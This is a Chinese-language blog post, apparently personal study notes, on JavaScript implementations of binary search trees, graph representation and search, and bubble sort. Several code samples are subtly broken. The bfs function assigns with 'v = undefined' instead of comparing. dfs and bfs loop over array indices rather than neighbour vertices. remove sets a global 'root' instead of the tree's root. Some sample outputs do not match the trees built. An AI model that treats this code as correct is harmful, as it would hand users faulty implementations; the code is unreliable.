<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在可以创建一个类，用来表示二叉查找树（BST）。我们让类只包含一个数据成员：一个表示二叉查找树根节点的Node对象。该类的构造函数将根节点初始化为null，以此创建一个空节点。</p>
<p>BST先要有一个insert方法，用来向树中加入新节点。这个方法有点复杂，需要着重讲解。首先要创建一个Node对象，将数据传入该对象保存。</p>
<p>其次检查BST是否有根节点，如果没有，那么这是棵新树，该节点就是根节点，这个方法到此也就完成了；否则，进入下一步。</p>
<p>如果待插入节点不是根节点，那么就需要准备遍历BST，找到插入的适当位置。该过程类似于遍历链表。用一个变量存储当前节点，一层层地遍历BST.</p>
<p>进入BST以后，下一步就要决定将节点放在哪个地方。找到正确的插入点时，会跳出循环。查找正确插入点的算法如下：</p>
<ol>
<li>设根节点为当前节点</li>
<li>如果待插入节点保存的数据小于当前节点，则设新的当前节点为原节点的左节点；反之，执行第4步</li>
<li>如果当前节点的左节点为null，就将新的节点插入这个位置，退出循环；反之，继续执行下一次循环</li>
<li>设新的当前节点为原节点的右节点</li>
<li>如果当前节点的右节点为null,就将新的节点插入这个位置，退出循环；反之，继续执行下一次循环。<br>根据上面的算法，实现BST类。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Node</span>(<span class="params">data, left, right</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.data = data;</span><br><span class="line">    <span class="keyword">this</span>.left = left;</span><br><span class="line">    <span class="keyword">this</span>.right = right;</span><br><span class="line">    <span class="keyword">this</span>.show = show;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BST</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.root = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.insert = insert;</span><br><span class="line">    <span class="keyword">this</span>.inOrder = inOrder;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="keyword">new</span> Node(data, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.root == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.root = n;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> current = <span class="keyword">this</span>.root;</span><br><span class="line">        <span class="keyword">var</span> parent;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            parent = current;</span><br><span class="line">            <span class="keyword">if</span> (data &lt; current.data) &#123;</span><br><span class="line">                current = current.left;</span><br><span class="line">                <span class="keyword">if</span> (current == <span class="literal">null</span>) &#123;</span><br><span class="line">                    parent.left = n;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                current = current.right;</span><br><span class="line">                <span class="keyword">if</span> (current == <span class="literal">null</span>) &#123;</span><br><span class="line">                    parent.right = n;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="遍历二叉查找树"><a href="#遍历二叉查找树" class="headerlink" title="遍历二叉查找树"></a>遍历二叉查找树</h2><p>有三种遍历BST的方式：中序、先序和后序。中序遍历按照节点上的键值，以升序访问BST上的所有节点。先序遍历先访问根节点，然后以同样方式访问左子树和右子树。后序遍历先访问叶子节点，从左子树到右子树，再到根节点。<br>中序遍历<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inOrder</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(node == <span class="literal">null</span>)) &#123;</span><br><span class="line">        inOrder(node.left);</span><br><span class="line">        <span class="built_in">console</span>.log(node.show() + <span class="string">" "</span>);</span><br><span class="line">        inOrder(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>中序遍历按照节点上的键值，以升序访问BST上的所有节点。<br>10 22 30 56 77 81 92<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/13.jpg" alt="avatar"></p>
<p>先序遍历<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">preOrder</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(node == <span class="literal">null</span>)) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(node.show() + <span class="string">" "</span>);</span><br><span class="line">        preOrder(node.left);</span><br><span class="line">        preOrder(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>先序遍历先访问根节点，然后以同样方式访问左子树和右子树。<br>50 10 5 15 70 60 80<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/14.jpg" alt="avatar"><br>后序遍历<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">postOrder</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(node == <span class="literal">null</span>)) &#123;</span><br><span class="line">        postOrder(node.left);</span><br><span class="line">        postOrder(node.right);</span><br><span class="line">        <span class="built_in">console</span>.log(node.show() + <span class="string">" "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>后序遍历先访问叶子节点，从左子树到右子树，再到根节点。<br>3 22 16 37 99 45 23<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/15.jpg" alt="avatar"></p>
<h2 id="查找最小值和最大值"><a href="#查找最小值和最大值" class="headerlink" title="查找最小值和最大值"></a>查找最小值和最大值</h2><p>查找最小值<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> current = <span class="keyword">this</span>.root;</span><br><span class="line">    <span class="keyword">while</span> (!(current.left == <span class="literal">null</span>)) &#123;</span><br><span class="line">        current = current.left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current.data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>查找最大值<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMax</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> current = <span class="keyword">this</span>.root;</span><br><span class="line">    <span class="keyword">while</span> (!(current.right == <span class="literal">null</span>)) &#123;</span><br><span class="line">        current = current.right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current.data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="查找给定值"><a href="#查找给定值" class="headerlink" title="查找给定值"></a>查找给定值</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> current = <span class="keyword">this</span>.root;</span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current.data == data) &#123;</span><br><span class="line">            <span class="keyword">return</span> current;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data &lt; current.data) &#123;</span><br><span class="line">            current = current.left;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            current = current.right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果找到给定值，该方法返回保存该值得节点；如果没找到，该方法返回null.</p>
<h2 id="从二叉查找树上删除节点-没怎么看懂"><a href="#从二叉查找树上删除节点-没怎么看懂" class="headerlink" title="从二叉查找树上删除节点(??没怎么看懂)"></a>从二叉查找树上删除节点(??没怎么看懂)</h2><p>我们使用递归操作，同时定义两方法：remove()和removeNode()<br>从BST中删除节点的第一步是判断当前节点是否包含待删除的数据，如果包含，则删除该节点；如果不包含，则比较当前节点上的数据和待删除的数据。如果待删除数据小于当前节点上的数据，则移至当前节点的左子节点继续比较；如果删除数据大于当前节点上的数据，则移至当前节点的右子节点继续比较。</p>
<p>如果待删除节点是叶子节点（没有子节点的节点），那么只需要将从父节点指向它的链接指向null.</p>
<p>如果待删除节点只包含一个子节点，那么原本指向它的节点就得做些调整，使其指向它的子节点。</p>
<p>最后，如果待删除节点包含两个子节点，正确的做法有两种：要么查找待删除节点左子树上的最大值，要么查找其右子树上的最小值。这里我们选择后一种方式。</p>
<p>我们需要一个查找子树上最小值的方法，后面会用它找到的最小值创建一个临时节点。将临时节点上的值复制到待删除节点，然后再删除临时节点。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/16.jpg" alt="avatar"><br>整个删除过程由两个方法完成。remove方法只是简单地接收删除数据，调用removeNode删除它，后者才是完成主要工作的方法：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    root = removeNode(<span class="keyword">this</span>.root, data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeNode</span>(<span class="params">node, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (data == node.data) &#123;</span><br><span class="line">        <span class="comment">// 没有子节点的节点</span></span><br><span class="line">        <span class="keyword">if</span> (node.left == <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 没有左子节点的节点</span></span><br><span class="line">        <span class="keyword">if</span> (node.left == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> node.right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 没有右子节点的节点</span></span><br><span class="line">        <span class="keyword">if</span> (node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> node.left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 有两个子节点的节点</span></span><br><span class="line">        <span class="keyword">var</span> tempNode = getSmallest(node.right);</span><br><span class="line">        node.data = tempNode.data;</span><br><span class="line">        node.right = removeNode(node.right,   tempNode.data);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data &lt; node.data) &#123;</span><br><span class="line">        node.left = removeNode(node.left, data);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        node.right = removeNode(node.right, data);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="计数"><a href="#计数" class="headerlink" title="计数"></a>计数</h2><p>我们来修改Node对象，为其增加一个记录成绩出现频次的成员，同时我们还需要一个方法，当在BST中发现某成绩时，需要将出现的次数加1，并且更新该节点。<br>先修改Node对象的定义<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Node</span>(<span class="params">data, left, right</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.data = data;</span><br><span class="line">    <span class="keyword">this</span>.count = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">this</span>.left = left;</span><br><span class="line">    <span class="keyword">this</span>.right = right;</span><br><span class="line">    <span class="keyword">this</span>.show = show;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>增加一个新方法update<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> grade = <span class="keyword">this</span>.find(data);</span><br><span class="line">    grade.count ++;</span><br><span class="line">    <span class="keyword">return</span> grade;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="图和图算法"><a href="#图和图算法" class="headerlink" title="图和图算法"></a>图和图算法</h1><p>本章将讨论用图给网络建模。</p>
<h2 id="图的定义"><a href="#图的定义" class="headerlink" title="图的定义"></a>图的定义</h2><p>图由边的集合及顶点的集合组成。边有顶点对（v1,v2）定义，v1和v2分别是图中的两个顶点。顶点也有权重，也称成本。如果一个图的顶点对是有序的，则可以称之为有向图。在对有向图中的顶点对排序后，便可以在两个顶点之间绘制一个箭头。有向图表明了顶点的流向。下图展示了一个有向图。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/17.jpg" alt="avatar"><br>如果图是无序的，则称之为无序图，或无向图。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/18.jpg" alt="avatar"><br>图中的一系列顶点构成路径，路径中所有的顶点都由边连接。路径的长度用路径中第一个顶点到最后一个顶点之间边的数量表示。由指向自身的顶点组成的路径称为环，环的长度为0。</p>
<p>圈是至少有一条边的路径，且路径的第一个顶点和最后一个顶点相同。无论是有向图还是无向图，只要是没有重复边或重复顶点的圈，就是一个简单圈。除了第一个和最后一个顶点以外，路径的其他顶点有重复的圈称为平凡圈。</p>
<p>如果两个顶点之间有路径，那么这两个顶点就是强连通的，反之亦然。如果有向图的所有的顶点都是强连通的，那么这个有向图也是强连通的。</p>
<h2 id="表示顶点"><a href="#表示顶点" class="headerlink" title="表示顶点"></a>表示顶点</h2><p>创建图类的第一步就是要创建一个Vertex类来保存顶点和边。这个类有两个数据成员：一个用于标识顶点，另一个是表明这个顶点是否被访问过的布尔值。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Vertex</span>(<span class="params">label</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.label = label;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们将所有顶点保存在数组中，在图类里，可以通过它们在数组中的位置引用它们。</p>
<h2 id="表示边"><a href="#表示边" class="headerlink" title="表示边"></a>表示边</h2><p>图的实际信息都保存在边上面，因为它们描述了图的结构。<br>我们将表示图的边的方法称为邻接表或者邻接表数组。这种方法将边存储为由顶点的相邻顶点列表构成的数组，并以此顶点作为索引。使用这种方案，当我们在程序中引用一个顶点时，可以高效地访问与这个顶点相连的所有顶点的列表。比如，如果顶点2与顶点0、1、3、4相连，并且它存储在数组中索引为2的位置，那么，访问这个元素，我们可以访问到索引为2的位置处由顶点0、1、3、4组成的数组。本章将选用这种表示方法。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/19.jpg" alt="avatar"><br>另一种表示图边的方法被称为邻接矩阵。它是一个二维数组，其中的元素表示两个顶点之间是否有一条边。</p>
<h2 id="构建图"><a href="#构建图" class="headerlink" title="构建图"></a>构建图</h2><p>Graph类的定义<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Graph</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.vertices = v;</span><br><span class="line">    <span class="keyword">this</span>.edges = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.adj = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.vertices; ++i) &#123;</span><br><span class="line">        <span class="keyword">this</span>.adj[i] = [];</span><br><span class="line">        <span class="keyword">this</span>.adj[i].push(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.addEdge = addEdge;</span><br><span class="line">    <span class="keyword">this</span>.toString = toString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个类会记录一个图表示了多少条边，并使用一个长度与图的顶点数相同的数组来记录顶点的数量。通过for循环为数组中的每个元素添加一个子数组来存储所有的相邻顶点，并将所有元素初始化为空字符串。<br>addEdge<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addEdge</span>(<span class="params">v, w</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.adj[v].push(w);</span><br><span class="line">    <span class="keyword">this</span>.adj[w].push(v);</span><br><span class="line">    <span class="keyword">this</span>.edges ++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>showGraph<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showGraph</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.vertices; ++i) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i + <span class="string">"-&gt;"</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="keyword">this</span>.vertices; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.adj[i][j] != <span class="literal">undefined</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="keyword">this</span>.adj[i][j] + <span class="string">' '</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>测试程序<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">g = <span class="keyword">new</span> Graph(<span class="number">5</span>);</span><br><span class="line">g.addEdge(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">g.addEdge(<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">g.addEdge(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">g.addEdge(<span class="number">2</span>,<span class="number">4</span>);</span><br><span class="line">g.showGraph();</span><br></pre></td></tr></table></figure></p>
<h2 id="搜索图"><a href="#搜索图" class="headerlink" title="搜索图"></a>搜索图</h2><p>确定从一个指定的顶点可以到达其他哪些顶点，这是经常对图执行的操作。图上的这些操作是用搜索算法执行的。在图上可以执行两种基础搜索：深度优先搜索和广度优先搜索。</p>
<h2 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h2><p>深度优先搜索包括从一条路径的起始顶点开始追溯，直到到达最后一个顶点，然后回溯，继续追溯下一条路径，直到到达最后的顶点，如此往复，直到没有路径为止。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/20.jpg" alt="avatar"><br>深度优先搜索算法比较简单：访问一个没有访问过的顶点，将它标记为已访问，再递归地去访问在初始顶点的邻接表中其他没有访问过的顶点。</p>
<p>要让该算法运行，需要为Graph类添加一个数组，用来存储已访问过的顶点，将它所有元素的值全部初始化为false.<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.marked = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.vertices; ++i) &#123;</span><br><span class="line">    <span class="keyword">this</span>.marked[i] = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>深度优先搜索函数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dfs</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.marked[v] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.adj[v] != <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"visited vertex: "</span> + v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> w <span class="keyword">in</span> <span class="keyword">this</span>.adj[v]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.marked[w]) &#123;</span><br><span class="line">            <span class="keyword">this</span>.dfs(w);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>测试<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">g = <span class="keyword">new</span> Graph(<span class="number">5</span>);</span><br><span class="line">g.addEdge(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">g.addEdge(<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">g.addEdge(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">g.addEdge(<span class="number">2</span>,<span class="number">4</span>);</span><br><span class="line">g.showGraph();</span><br><span class="line">g.dfs(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h2><p>广度优先搜索从第一个顶点开始，尝试访问尽可能靠近它的顶点。本质上，这种搜索在图上是逐层移动的，首先检查第一个顶点的层，再逐渐向下移动到离起始顶点最远的层。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/21.jpg" alt="avatar"><br>广度优先搜索算法使用了抽象的队列而不是数组来对已访问过的顶点进行排序。工作原理如下</p>
<ol>
<li>查找与当前顶点相邻的未访问顶点，将其添加到已访问顶点列表及队列中</li>
<li>从图中取出下一个顶点v，添加到已访问的顶点列表</li>
<li>将所有与v相邻的未访问顶点添加到队列<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bfs</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> queue = [];</span><br><span class="line">    <span class="keyword">this</span>.marked[s] = <span class="literal">true</span>;</span><br><span class="line">    queue.push(s); <span class="comment">// 添加到队尾</span></span><br><span class="line">    <span class="keyword">while</span> (queue.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> v = queue.shift();</span><br><span class="line">        <span class="keyword">if</span> (v = <span class="literal">undefined</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"visited vertex:"</span> + v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> w <span class="keyword">in</span> <span class="keyword">this</span>.adj[v]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.marked[w]) &#123;</span><br><span class="line">                <span class="keyword">this</span>.edgeTo[w] = v;</span><br><span class="line">                <span class="keyword">this</span>.marked[w] = <span class="literal">true</span>;</span><br><span class="line">                queue.push(w);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="查找最短路径-暂略"><a href="#查找最短路径-暂略" class="headerlink" title="查找最短路径 ???暂略"></a>查找最短路径 ???暂略</h2><p>在执行广度优先搜索时，会自动查找从一个顶点到另一个相连顶点的最短路径。例如，要查找从顶点A到顶点D的最短路径，我们首先会查找从A到D是否有任何一条单边路径，接着查找两条边的路径，以此类推。因此我们可以轻松地修改广度优先搜索算法，找出最短路径。</p>
<h2 id="拓扑排序-暂略"><a href="#拓扑排序-暂略" class="headerlink" title="拓扑排序 ???暂略"></a>拓扑排序 ???暂略</h2><h1 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h1><p>本文将介绍数据排序的基本算法和高级算法。这些算法都只依赖数组来存储数据。</p>
<h2 id="数组测试平台"><a href="#数组测试平台" class="headerlink" title="数组测试平台"></a>数组测试平台</h2><p>首先我们构造一个数组测试平台类<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CArray</span>(<span class="params">numElements</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.dataStore = [];</span><br><span class="line">    <span class="keyword">this</span>.numElements = numElements;</span><br><span class="line">    <span class="keyword">this</span>.toString = toString;</span><br><span class="line">    <span class="keyword">this</span>.clear = clear;</span><br><span class="line">    <span class="keyword">this</span>.setData = setData;</span><br><span class="line">    <span class="keyword">this</span>.swap = swap;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.numElements; ++i) &#123;</span><br><span class="line">    <span class="keyword">this</span>.dataStore[i] = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (<span class="keyword">this</span>.numElements + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.numElements; ++i) &#123;</span><br><span class="line">    <span class="keyword">this</span>.dataStore[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> restr = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.numElements; ++i) &#123;</span><br><span class="line">    restr += <span class="keyword">this</span>.dataStore[i] + <span class="string">" "</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; i % <span class="number">10</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        restr += <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> restr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, index1, index2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> temp = arr[index1];</span><br><span class="line">    arr[index1] = arr[index2];</span><br><span class="line">    arr[index2] = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用测试平台类<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> numElements = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">var</span> myNums = <span class="keyword">new</span> CArray(numElements);</span><br><span class="line">myNums.setData();</span><br><span class="line"><span class="built_in">console</span>.log(myNums.toString());</span><br></pre></td></tr></table></figure></p>
<h2 id="基本排序算法"><a href="#基本排序算法" class="headerlink" title="基本排序算法"></a>基本排序算法</h2><p>这些算法非常逼真地模拟了人类在现实生活中对数据的排序。</p>
<h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p>它是最慢的排序算法之一，但也是一种最容易实现的排序算法。<br>之所以叫冒泡排序是因为使用这种排序算法排序时，数据值会像气泡一样从数组的一端漂浮到另一端。假设正在将一组数字按照升序排列，较大的值会浮动到数组的右侧，而较小的值则会浮动到数组的左侧。之所以会产生这种现象是因为算法会多次在数组中移动，比较相邻的数据，当左侧值大于右侧值时将它们进行互换。</p>
<p>冒泡排序的代码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bubbleSort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> numElements = <span class="keyword">this</span>.dataStore.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> outer = numElements; outer &gt;= <span class="number">2</span>; --outer) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> inner = <span class="number">0</span>; inner &lt; outer - <span class="number">1</span>; ++inner) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.dataStore[inner] &gt; <span class="keyword">this</span>.dataStore[inner + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">this</span>.swap(<span class="keyword">this</span>.dataStore, inner, inner + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
